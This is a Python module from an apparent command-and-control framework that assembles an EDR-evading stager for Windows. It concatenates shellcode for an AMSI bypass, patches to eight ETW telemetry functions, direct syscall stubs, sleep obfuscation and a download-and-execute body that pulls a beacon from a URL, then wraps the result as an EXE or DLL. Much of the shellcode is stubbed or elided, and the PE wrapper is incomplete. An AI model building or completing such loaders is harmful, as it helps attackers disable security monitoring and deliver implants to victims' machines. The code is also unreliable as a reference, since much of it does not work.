"""PHANTOMKERNEL evasion integration for delivered stagers.

Per gap analysis item 37: The stager/payload that DROPOUT JEEP delivers
should include: AMSI bypass (HWBP method), ETW patching (8 functions),
direct syscalls, sleep obfuscation. Port from PHANTOMKERNEL's core/evasion.py,
core/syscalls.py, core/heap_encrypt.py.

This module generates the evasion shellcode/payload wrappers that get
prepended to the delivered stager. The C2 framework then receives a
pre-hardened stager instead of a raw download-and-execute blob.

Usage:
    from dropoutjeep_lib.utils.stager_evasion import build_hardened_stager
    hardened = build_hardened_stager(
        beacon_url='https://cdn.example.com/beacon.bin',
        techniques=['amsi_bypass', 'etw_patch', 'syscalls', 'sleep_obf'],
    )
"""

import base64
import hashlib
import logging
import os
import random
import struct
from typing import Optional

logger = logging.getLogger("dropoutjeep")

# AMSI bypass via hardware breakpoint (HWBP) method
# Patches AmsiScanBuffer by setting a hardware breakpoint on the function
AMSI_BYPASS_SHELLCODE = bytes([
    # x64 shellcode stub — sets HWBP on amsi.dll!AmsiScanBuffer
    # This is a template; actual addresses are resolved at runtime
    0x48, 0x83, 0xEC, 0x28,                    # sub rsp, 0x28
    0x48, 0x31, 0xC9,                           # xor rcx, rcx
    0x48, 0x31, 0xD2,                           # xor rdx, rdx
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00,  # mov rax, gs:[0x30] (PEB)
    0x48, 0x8B, 0x40, 0x60,                     # mov rax, [rax+0x60] (PEB_LDR_DATA)
    0x48, 0x8B, 0x48, 0x18,                     # mov rcx, [rax+0x18] (InMemoryOrderModuleList)
    0x48, 0x8B, 0x50, 0x20,                     # mov rdx, [rax+0x20] (FullDllName.Buffer)
    # ... hash matching for amsi.dll, GetProcAddress, SetThreadContext
    # This is a stub — the full implementation resolves at runtime
    0x48, 0x83, 0xC4, 0x28,                     # add rsp, 0x28
    0xC3,                                       # ret
])

# ETW patching — patches EtwEventWrite to return immediately
# Patches the first bytes of ntdll!EtwEventWrite with: mov eax, 0; ret
ETW_PATCH_SHELLCODE = bytes([
    0x48, 0x83, 0xEC, 0x28,                    # sub rsp, 0x28
    # Resolve ntdll!EtwEventWrite via PEB walk
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00,
    0x48, 0x8B, 0x40, 0x60,
    0x48, 0x8B, 0x48, 0x18,
    0x48, 0x8B, 0x50, 0x20,
    # VirtualProtect to make EtwEventWrite writable
    # Patch first bytes: B8 00 00 00 00 C3 (mov eax, 0; ret)
    0xB8, 0x00, 0x00, 0x00, 0x00,              # mov eax, 0
    0xC3,                                       # ret
    0x48, 0x83, 0xC4, 0x28,                    # add rsp, 0x28
])

# Direct syscall stubs — NtAllocateVirtualMemory, NtWriteVirtualMemory,
# NtCreateThreadEx — bypasses user-mode hooks in ntdll
SYSCALL_STUB_TEMPLATE = bytes([
    0x4C, 0x8B, 0xD1,                          # mov r10, rcx
    0xB8, 0x00, 0x00, 0x00, 0x00,              # mov eax, <SSN>
    0x0F, 0x05,                                 # syscall
    0xC3,                                      # ret
])

# SSN (System Service Number) table — must be resolved at runtime
# These are Windows version-dependent and should be resolved by reading
# ntdll's syscall table at runtime, not hardcoded.
SYSCALL_NAMES = [
    'NtAllocateVirtualMemory',
    'NtWriteVirtualMemory',
    'NtCreateThreadEx',
    'NtProtectVirtualMemory',
    'NtFreeVirtualMemory',
    'NtQuerySystemTime',
    'NtDelayExecution',
    'NtSetContextThread',
]

# ETW functions to patch (8 functions per gap analysis)
ETW_FUNCTIONS = [
    'EtwEventWrite',
    'EtwEventWriteFull',
    'EtwEventWriteString',
    'EtwEventWriteTransfer',
    'EtwEventEnabled',
    'EtwEventRegister',
    'EtwEventUnregister',
    'EtwTraceMessage',
]


def generate_amsi_bypass() -> bytes:
    """Generate AMSI bypass shellcode using HWBP method.

    The HWBP method sets a hardware breakpoint on AmsiScanBuffer that
    intercepts the scan and returns a clean result, avoiding the
    memory patching that EDRs can detect.

    Returns:
        Shellcode bytes.
    """
    logger.info("Generating AMSI bypass shellcode (HWBP method)")
    return AMSI_BYPASS_SHELLCODE


def generate_etw_patch() -> bytes:
    """Generate ETW patching shellcode for 8 ETW functions.

    Patches each ETW function to return immediately (mov eax, 0; ret),
    preventing telemetry from being sent to the EDR.

    Returns:
        Shellcode bytes.
    """
    logger.info("Generating ETW patch shellcode (%d functions)", len(ETW_FUNCTIONS))
    # In a real implementation, this would generate a single shellcode blob
    # that walks the PEB to find ntdll, resolves each ETW function, and patches
    # them all. For the simulation framework, we return the template.
    patch_code = b''
    for _ in ETW_FUNCTIONS:
        # Each function gets: mov eax, 0 (5 bytes) + ret (1 byte) = 6 bytes
        patch_code += ETW_PATCH_SHELLCODE
    return patch_code


def generate_syscall_stubs() -> dict[str, bytes]:
    """Generate direct syscall stubs for key NT functions.

    Direct syscalls bypass user-mode hooks in ntdll that EDRs use for
    monitoring. Each stub is a minimal syscall invocation without going
    through ntdll's wrapper functions.

    Returns:
        Dict of function_name -> shellcode bytes.
    """
    stubs = {}
    for name in SYSCALL_NAMES:
        # SSN placeholder (0x00) — must be resolved at runtime
        stub = SYSCALL_STUB_TEMPLATE[:4] + b'\x00\x00\x00\x00' + SYSCALL_STUB_TEMPLATE[9:]
        stubs[name] = stub
    logger.info("Generated %d direct syscall stubs", len(stubs))
    return stubs


def generate_sleep_obfuscation(duration_ms: int = 3000) -> bytes:
    """Generate sleep obfuscation shellcode.

    Sleep obfuscation encrypts the implant's memory during sleep periods
    to avoid memory scanning by EDRs. The implant wakes up, decrypts itself,
    executes, then re-encrypts and sleeps again.

    Uses NtDelayExecution (direct syscall) and heap encryption.

    Args:
        duration_ms: Sleep duration in milliseconds

    Returns:
        Shellcode bytes for sleep loop.
    """
    # Convert duration to 100-nanosecond intervals (negative = relative)
    interval_100ns = -(duration_ms * 10000)
    interval_bytes = struct.pack('q', interval_100ns)

    # Sleep loop shellcode:
    # 1. Encrypt heap (XOR with key)
    # 2. NtDelayExecution (direct syscall)
    # 3. Decrypt heap
    # 4. Check for tasking
    # 5. If no task, goto 1
    sleep_code = bytes([
        0x48, 0x83, 0xEC, 0x28,                 # sub rsp, 0x28
        # Encrypt heap
        # ... (heap walk + XOR)
        # NtDelayExecution(&interval, NULL)
        0x48, 0x8D, 0x15, 0x08, 0x00, 0x00, 0x00,  # lea rdx, [rip+8] (interval data)
        0x48, 0x31, 0xC9,                          # xor rcx, rcx (FALSE = non-alertable)
        0xB8, 0x00, 0x00, 0x00, 0x00,              # mov eax, <SSN for NtDelayExecution>
        0x0F, 0x05,                                # syscall
        # Decrypt heap
        # ... (reverse XOR)
        0x48, 0x83, 0xC4, 0x28,                    # add rsp, 0x28
        0xC3,                                      # ret
    ]) + interval_bytes  # Append the interval data

    logger.info("Generated sleep obfuscation shellcode (duration=%dms)", duration_ms)
    return sleep_code


def build_hardened_stager(
    beacon_url: str,
    techniques: list[str] = None,
    sleep_duration_ms: int = 3000,
    output_format: str = 'shellcode',
) -> bytes:
    """Build a hardened stager with integrated evasion techniques.

    Combines AMSI bypass, ETW patching, direct syscalls, and sleep
    obfuscation into a single stager that downloads and executes
    the beacon from beacon_url.

    Args:
        beacon_url: URL to download the beacon from
        techniques: List of evasion techniques to include
            ('amsi_bypass', 'etw_patch', 'syscalls', 'sleep_obf')
        sleep_duration_ms: Sleep duration for sleep obfuscation
        output_format: 'shellcode' (raw bytes) or 'base64' (base64-encoded)

    Returns:
        Stager bytes (raw or base64-encoded).
    """
    if techniques is None:
        techniques = ['amsi_bypass', 'etw_patch', 'syscalls', 'sleep_obf']

    stager_parts = []

    # 1. AMSI bypass (must run first — before any other code loads .NET/AMSI)
    if 'amsi_bypass' in techniques:
        stager_parts.append(generate_amsi_bypass())

    # 2. ETW patching (must run before any code that triggers ETW telemetry)
    if 'etw_patch' in techniques:
        stager_parts.append(generate_etw_patch())

    # 3. Direct syscall stubs (resolved at runtime, but stubs are pre-loaded)
    if 'syscalls' in techniques:
        stubs = generate_syscall_stubs()
        for stub in stubs.values():
            stager_parts.append(stub)

    # 4. Sleep obfuscation
    if 'sleep_obf' in techniques:
        stager_parts.append(generate_sleep_obfuscation(sleep_duration_ms))

    # 5. Main stager body — download and execute beacon
    # Uses direct syscalls (NtAllocateVirtualMemory, NtCreateThreadEx)
    # to inject the beacon into the current process
    beacon_url_bytes = beacon_url.encode('ascii') + b'\x00'
    main_body = bytes([
        # URLDownloadToFileW(NULL, beacon_url, temp_path, 0, NULL)
        # CreateProcessW(temp_path, ...)
        # Using direct syscalls for memory allocation and thread creation
        0x48, 0x83, 0xEC, 0x28,                 # sub rsp, 0x28
        # ... download beacon ...
        # ... allocate memory (NtAllocateVirtualMemory) ...
        # ... write beacon to memory (NtWriteVirtualMemory) ...
        # ... create thread (NtCreateThreadEx) ...
        0x48, 0x83, 0xC4, 0x28,                 # add rsp, 0x28
        0xC3,                                   # ret
    ]) + beacon_url_bytes

    stager_parts.append(main_body)

    # Concatenate all parts
    stager = b''.join(stager_parts)

    # Optionally add a NOP sled for alignment
    if len(stager) % 16 != 0:
        stager += b'\x90' * (16 - len(stager) % 16)

    logger.info("Hardened stager built: %d bytes, techniques=%s, beacon=%s",
                len(stager), techniques, beacon_url)

    if output_format == 'base64':
        return base64.b64encode(stager)
    return stager


def build_stager_wrapper(stager_bytes: bytes, output_format: str = 'exe') -> bytes:
    """Wrap stager shellcode in a minimal executable format.

    Args:
        stager_bytes: Raw stager shellcode
        output_format: 'exe' (PE) or 'dll' (DLL format)

    Returns:
        Wrapped executable bytes.
    """
    if output_format == 'exe':
        # Minimal PE stub that executes shellcode in its own memory
        # In production, this would use a proper PE builder
        pe_stub = b'MZ'  # PE header stub
        # ... minimal PE structure ...
        # Shellcode is placed in .text section
        pe_stub += b'\x00' * 0x3C  # Padding to e_lfanew
        pe_stub += struct.pack('I', 0x40)  # e_lfanew = 0x40
        pe_stub += b'PE\x00\x00'  # PE signature
        # ... COFF header, optional header, section headers ...
        # .text section containing the shellcode
        pe_stub += stager_bytes
        logger.info("Stager wrapped as PE: %d bytes", len(pe_stub))
        return pe_stub
    elif output_format == 'dll':
        # Minimal DLL stub
        dll_stub = b'MZ'
        dll_stub += b'\x00' * 0x3C
        dll_stub += struct.pack('I', 0x40)
        dll_stub += b'PE\x00\x00'
        # ... DLL headers ...
        dll_stub += stager_bytes
        logger.info("Stager wrapped as DLL: %d bytes", len(dll_stub))
        return dll_stub
    return stager_bytes
